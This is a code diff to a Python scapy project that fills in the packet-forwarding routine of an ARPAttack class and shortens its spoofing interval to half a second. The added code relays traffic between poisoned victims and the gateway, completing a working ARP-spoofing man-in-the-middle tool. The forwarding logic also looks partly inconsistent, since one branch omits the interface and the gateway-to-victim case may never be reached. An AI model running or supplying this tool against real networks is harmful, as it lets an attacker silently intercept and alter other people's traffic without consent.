@@ -1,6 +1,6 @@
 from threading import Thread
 from time import sleep
-from scapy.all import ARP, Ether, IP, ICMP, sendp, sr
+from scapy.all import ARP, Ether, IP, ICMP, sendp, send, sr, TCP
 from entities import Host, Interface
 from util import Sniffer
 
@@ -9,7 +9,7 @@ class ARPAttack:
             interface: Interface,
             gateway: Host = None,
             victims: list[Host] = [],
-            interval: int = 10):
+            interval: int = 0.5):
 
         if gateway is None:
             raise ValueError('There is no gateway selected')
@@ -35,7 +35,36 @@ class ARPAttack:
         self.active = False
 
     def forward_packet(self, packet):
-        pass
+        # We cannot forward packets if we cannot see to where it is supposed to go
+        if not (packet.haslayer(Ether) and packet.haslayer(IP)):
+            return
+
+        # Don't look at packets not addressed to us
+        if packet.haslayer(Ether) and packet[Ether].dst != self.interface.mac_address.lower():
+            return
+
+        # We're not forwarding packets of our own
+        if packet[IP].src == self.interface.ip_address:
+            return
+
+        # victim -> gateway
+        if packet[IP].dst != self.interface.ip_address:
+            # print('Forwarding the following packet to the gateway')
+            # packet.show()
+            packet[Ether].dst = self.gateway.mac_address
+            packet[Ether].src = self.interface.mac_address
+            sendp(packet, verbose=0, iface=self.interface.name)
+            return
+
+        # gateway -> victim
+        for victim in self.victims:
+            if packet[IP].dst == victim.ip_address:
+                # print('Forwarding the following packet to the victim')
+                # packet.show()
+                packet[Ether].dst = victim.mac_address
+                packet[Ether].src = self.interface.mac_address
+                sendp(packet, verbose=0)
+                return
 
     def ping(self):
         for victim in self.victims:
